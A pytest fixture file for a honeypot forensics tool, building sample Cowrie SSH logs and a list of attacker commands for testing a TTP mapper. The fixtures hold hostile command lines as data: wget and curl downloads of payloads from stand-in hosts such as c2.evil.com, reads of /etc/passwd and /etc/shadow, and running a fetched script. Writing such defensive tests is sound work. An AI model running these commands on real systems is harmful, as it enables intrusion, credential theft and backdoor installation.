"""
Pytest configuration and shared fixtures.
Part of MAXIMUS VÉRTICE - Projeto Tecido Reativo
Sprint 1 Test Suite
"""

import pytest
from pathlib import Path
from typing import Dict, Any
import json
from datetime import datetime


@pytest.fixture
def tmp_forensics_dir(tmp_path: Path) -> Path:
    """Create temporary forensics directory structure."""
    forensics = tmp_path / "forensics"
    forensics.mkdir()
    return forensics


@pytest.fixture
def sample_cowrie_log_content() -> str:
    """Return sample Cowrie JSON log content."""
    entries = [
        {
            "eventid": "cowrie.login.success",
            "username": "root",
            "password": "toor",
            "src_ip": "45.142.120.15",
            "timestamp": "2025-10-12T20:00:00.000Z",
            "session": "a1b2c3d4"
        },
        {
            "eventid": "cowrie.command.input",
            "input": "uname -a",
            "timestamp": "2025-10-12T20:00:05.000Z",
            "session": "a1b2c3d4"
        },
        {
            "eventid": "cowrie.command.input",
            "input": "whoami",
            "timestamp": "2025-10-12T20:00:06.000Z",
            "session": "a1b2c3d4"
        },
        {
            "eventid": "cowrie.command.input",
            "input": "cat /etc/passwd",
            "timestamp": "2025-10-12T20:00:10.000Z",
            "session": "a1b2c3d4"
        },
        {
            "eventid": "cowrie.command.input",
            "input": "wget http://malicious.com/payload.sh",
            "timestamp": "2025-10-12T20:00:15.000Z",
            "session": "a1b2c3d4"
        },
        {
            "eventid": "cowrie.session.file_download",
            "shasum": "5d41402abc4b2a76b9719d911017c592",
            "url": "http://malicious.com/payload.sh",
            "timestamp": "2025-10-12T20:00:20.000Z",
            "session": "a1b2c3d4"
        },
        {
            "eventid": "cowrie.command.input",
            "input": "chmod +x payload.sh",
            "timestamp": "2025-10-12T20:00:25.000Z",
            "session": "a1b2c3d4"
        },
        {
            "eventid": "cowrie.session.closed",
            "timestamp": "2025-10-12T20:00:30.000Z",
            "session": "a1b2c3d4"
        }
    ]
    
    return "\n".join(json.dumps(entry) for entry in entries)


@pytest.fixture
def sample_cowrie_log(tmp_forensics_dir: Path, sample_cowrie_log_content: str) -> Path:
    """Create sample Cowrie log file."""
    honeypot_dir = tmp_forensics_dir / "cowrie_ssh_001"
    honeypot_dir.mkdir()
    
    log_file = honeypot_dir / "session_20251012.json"
    log_file.write_text(sample_cowrie_log_content)
    
    return log_file


@pytest.fixture
def malformed_cowrie_log(tmp_forensics_dir: Path) -> Path:
    """Create malformed Cowrie log for error testing."""
    honeypot_dir = tmp_forensics_dir / "cowrie_ssh_002"
    honeypot_dir.mkdir()
    
    log_file = honeypot_dir / "malformed.json"
    log_file.write_text("""
{"eventid": "cowrie.login.success", "username": "root"}
{INVALID JSON LINE - SHOULD BE SKIPPED}
{"eventid": "cowrie.command.input", "input": "whoami"}
""")
    
    return log_file


@pytest.fixture
def empty_cowrie_log(tmp_forensics_dir: Path) -> Path:
    """Create empty Cowrie log."""
    honeypot_dir = tmp_forensics_dir / "cowrie_ssh_003"
    honeypot_dir.mkdir()
    
    log_file = honeypot_dir / "empty.json"
    log_file.write_text("")
    
    return log_file


@pytest.fixture
def realistic_attack_commands() -> list:
    """
    Realistic SSH brute force + post-exploitation command sequence.
    Used for TTP mapper validation.
    """
    return [
        "uname -a",
        "whoami",
        "id",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "ls -la /root",
        "find / -name '*.conf'",
        "wget http://malicious.com/payload.sh",
        "curl -O http://c2.evil.com/backdoor",
        "chmod +x payload.sh",
        "./payload.sh",
        "crontab -e",
        "ps aux | grep root",
        "netstat -antp",
        "iptables -L"
    ]


@pytest.fixture
def sample_attack_data() -> Dict[str, Any]:
    """Sample parsed attack data structure."""
    return {
        "attacker_ip": "45.142.120.15",
        "attack_type": "ssh_brute_force",
        "commands": [
            "uname -a",
            "whoami",
            "cat /etc/passwd",
            "wget http://malicious.com/payload.sh"
        ],
        "credentials": [("root", "toor"), ("admin", "admin123")],
        "file_hashes": ["5d41402abc4b2a76b9719d911017c592"],
        "timestamps": [datetime.fromisoformat("2025-10-12T20:00:00")],
        "sessions": [{"id": "a1b2c3d4", "duration": 30}],
        "metadata": {
            "honeypot_type": "ssh",
            "honeypot_id": "ssh_001"
        }
    }
